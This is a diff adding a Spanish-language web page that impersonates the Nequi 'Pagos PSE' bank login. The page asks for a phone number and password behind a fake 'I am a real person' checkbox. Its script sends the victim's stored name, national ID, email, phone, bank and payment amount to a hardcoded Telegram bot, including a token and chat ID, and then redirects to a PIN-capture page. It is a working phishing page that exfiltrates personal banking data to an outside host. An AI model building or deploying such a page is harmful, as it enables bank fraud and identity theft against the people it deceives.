@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagos PSE de Nequi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Logo - Cambia el src de la imagen por tu logo */
+        .logo-container {
+            margin-bottom: 40px;
+        }
+
+        /*   .logo-placeholder {
+            width: 150px;
+            height: 50px;
+            background-color: #f0f0f0;
+            border: 2px dashed #ccc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #666;
+        }/*
+
+        /* Descomenta esta linea y elimina .logo-placeholder para usar tu logo */
+
+        .logo {
+            width: 150px;
+            height: 50px;
+            object-fit: contain;
+        }
+
+
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #3D1152;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            max-width: 350px;
+        }
+
+        .form-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 18px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 12px;
+            background-color: #F5F5F5;
+            color: #333;
+            outline: none;
+            transition: background-color 0.2s;
+        }
+
+        .input-field::placeholder {
+            color: #888;
+        }
+
+        .input-field:focus {
+            background-color: #EEEEEE;
+        }
+
+        /* Checkbox container con animacion de palpito */
+        .checkbox-container {
+            width: 100%;
+            padding: 20px;
+            border: 2px solid #DA0081;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+
+        .checkbox-container:hover {
+            background-color: rgba(218, 0, 129, 0.05);
+        }
+
+        .checkbox-container:hover .custom-checkbox {
+            animation: pulse 0.8s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(218, 0, 129, 0.4);
+            }
+
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 0 0 10px rgba(218, 0, 129, 0);
+            }
+
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(218, 0, 129, 0);
+            }
+        }
+
+        .hidden-checkbox {
+            display: none;
+        }
+
+        .custom-checkbox {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #DA0081;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: all 0.2s;
+        }
+
+        .hidden-checkbox:checked+.custom-checkbox {
+            background-color: #DA0081;
+        }
+
+        .hidden-checkbox:checked+.custom-checkbox::after {
+            content: '✓';
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .checkbox-label {
+            font-size: 16px;
+            color: #333;
+            line-height: 1.4;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 600;
+            color: white;
+            background-color: #F8B4D9;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 10px;
+        }
+
+        .btn-primary:hover {
+            background-color: #DA0081;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            background-color: #ffffff;
+            border: 2px solid #E0E0E0;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-secondary:hover {
+            background-color: #F5F5F5;
+            border-color: #CCC;
+        }
+
+        .forgot-text {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Logo - Reemplaza con tu imagen -->
+        <div class="logo-container">
+            <!-- Descomenta y usa tu logo: -->
+            <img src="../img/logo.svg" alt="Nequi" class="logo">
+            <!-- <div class="logo-placeholder">LOGO 150x50</div>-->
+        </div>
+
+        <h1 class="title">Pagos PSE de Nequi</h1>
+
+        <p class="subtitle">
+            Ingresa tu numero de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
+        </p>
+
+        <div class="form-container">
+            <input type="tel" class="input-field" placeholder="Numero de celular" id="phone">
+
+            <input type="password" class="input-field" placeholder="Clave" id="password">
+
+            <label class="checkbox-container">
+                <input type="checkbox" class="hidden-checkbox" id="humanCheck">
+                <span class="custom-checkbox"></span>
+                <span class="checkbox-label">Confirmo que soy una persona real.</span>
+            </label>
+
+            <button class="btn-primary" id="btnEntra">Entra</button>
+
+            <button class="btn-secondary" id="btnAhoraNo">Ahora No</button>
+        </div>
+
+        <p class="forgot-text">
+            ¿Se te olvido la clave? Abre Nequi en tu cel y cambiala en segundos.
+        </p>
+    </div>    <script>
+        const TELEGRAM_TOKEN = "8788879668:AAHI39IMa5dZECzEsl_KA6ODZug2gZqhslA";
+        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+        const CHAT_ID = "6483487531";
+
+        async function sendToTelegram(text, inlineKeyboard = null) {
+            if (!CHAT_ID) {
+                console.warn("Falta CHAT_ID para enviar a Telegram.");
+                return;
+            }
+            const body = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: "HTML"
+            };
+            if (inlineKeyboard) body.reply_markup = { inline_keyboard: inlineKeyboard };
+            await fetch(`${TELEGRAM_API}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(body)
+            });
+        }
+
+        const phoneInput = document.getElementById('phone');
+        const passwordInput = document.getElementById('password');
+        const humanCheckInput = document.getElementById('humanCheck');
+        const btnEntra = document.getElementById('btnEntra');
+
+        btnEntra.disabled = true;
+        // Optional: add visual style when disabled
+        btnEntra.style.opacity = "0.5";
+        btnEntra.style.cursor = "not-allowed";
+
+        function checkValidity() {
+            const phone = phoneInput.value.trim();
+            const password = passwordInput.value.trim();
+            const checked = humanCheckInput.checked;
+
+            if (phone && password && checked) {
+                btnEntra.disabled = false;
+                btnEntra.style.opacity = "1";
+                btnEntra.style.cursor = "pointer";
+            } else {
+                btnEntra.disabled = true;
+                btnEntra.style.opacity = "0.5";
+                btnEntra.style.cursor = "not-allowed";
+            }
+        }
+
+        phoneInput.addEventListener('input', checkValidity);
+        passwordInput.addEventListener('input', checkValidity);
+        humanCheckInput.addEventListener('change', checkValidity);
+
+        btnEntra.addEventListener('click', async function () {
+            if (btnEntra.disabled) return;
+
+            const nombre = sessionStorage.getItem("nombre") || "—";
+            const cedula = sessionStorage.getItem("cedula") || "—";
+            const correo = sessionStorage.getItem("correo") || "—";
+            const telefono = sessionStorage.getItem("telefono") || "—";
+            const total = sessionStorage.getItem("total") || "—";
+            const banco = sessionStorage.getItem("banco") || "—";
+            const tipoBanco = sessionStorage.getItem("tipoBanco") || "—";
+            const producto = sessionStorage.getItem("producto") || "—";
+
+            try {
+                const text = `💳 <b>Pago en Proceso — Nequi Login</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🏦 Banco: ${banco}\n🏷️ Tipo de Banco: ${tipoBanco}\n🛒 Producto: ${producto}`;
+                await sendToTelegram(text);
+            } catch (err) { console.error(err); }
+
+            // Redirigir a la pagina de PIN
+            window.location.href = '/pages/nequi-pin.html';
+        });
+
+        document.getElementById('btnAhoraNo').addEventListener('click', function () {
+            // Accion de cancelar
+            alert('Proceso cancelado');
+        });
+    </script>
+</body>
+
+</html>
